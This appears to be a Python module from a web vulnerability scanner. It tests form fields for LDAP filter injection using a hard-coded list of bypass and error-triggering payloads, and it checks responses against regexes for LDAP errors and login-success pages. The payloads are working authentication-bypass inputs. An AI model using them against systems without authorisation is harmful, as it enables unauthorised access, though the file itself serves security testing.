"""
LDAP Injection Scanner
Detects LDAP filter injection by submitting payloads that manipulate
DN/filter syntax, watching for authentication bypass or verbose error messages.
"""
import re
from typing import TYPE_CHECKING

from .base import BaseScanner, Finding

if TYPE_CHECKING:
    from wscan.engine import ScanEngine

_LDAP_PAYLOADS: list[str] = [
    # Authentication bypass / filter escape
    "*)(cn=*))(|(cn=*",
    "*)(uid=*))(|(uid=*",
    "admin)(&)",
    "admin)(|(password=*)",
    "*))(|(objectClass=*",
    # DN injection (path traversal through DIT)
    "admin,dc=example,dc=com",
    "cn=*",
    # Error-triggering syntax
    ")(invalid",
    "*))%00",
]

# Patterns indicating a successful injection or LDAP error leak
_ERROR_RE = re.compile(
    r"ldap(?:://|\s+error|exception)|javax\.naming|"
    r"invalid\s+dn|bad\s+search\s+filter|"
    r"no\s+such\s+object|size\s+limit\s+exceeded|"
    r"org\.springframework\.ldap|"
    r"com\.sun\.jndi\.ldap",
    re.IGNORECASE,
)
_BYPASS_RE = re.compile(
    r"(?:welcome|dashboard|logged in|authenticated|admin panel)",
    re.IGNORECASE,
)


class LDAPScanner(BaseScanner):
    """LDAP filter injection scanner."""

    CHECK_TYPE = "ldap"
    SEVERITY = "high"

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        field_name = field.get("name") or field.get("id") or f"field_{form_index}"
        findings: list[Finding] = []

        # Obtain a baseline response first
        try:
            baseline_html, _ = await self.browser.submit_form(
                url, form_index, {field_name: "normaluser"}
            )
        except Exception as exc:
            if self.monitor:
                await self.monitor.emit_status(
                    f"[warn] ldap: baseline failed on {url} ({field_name}): {exc}"
                )
            return []

        for payload in _LDAP_PAYLOADS:
            if self.monitor:
                await self.monitor.emit_payload_test(url, field_name, payload, self.CHECK_TYPE)
            try:
                html, _ = await self.browser.submit_form(
                    url, form_index, {field_name: payload}
                )
            except Exception as exc:
                if self.monitor:
                    await self.monitor.emit_status(
                        f"[warn] ldap: request failed on {url} ({field_name}): {exc}"
                    )
                continue

            evidence = None
            if _ERROR_RE.search(html):
                evidence = (
                    f"LDAP injection: LDAP error or class name leaked in response "
                    f"with payload {payload!r}"
                )
            elif _BYPASS_RE.search(html) and not _BYPASS_RE.search(baseline_html):
                evidence = (
                    f"LDAP injection: authentication bypass — success page appeared "
                    f"only with payload {payload!r}"
                )

            if evidence:
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=evidence,
                    pair={},
                    severity="high",
                )
                findings.append(finding)
                break  # one confirmed finding per field

        return findings

    async def scan_page(self, url: str) -> list[Finding]:
        return []
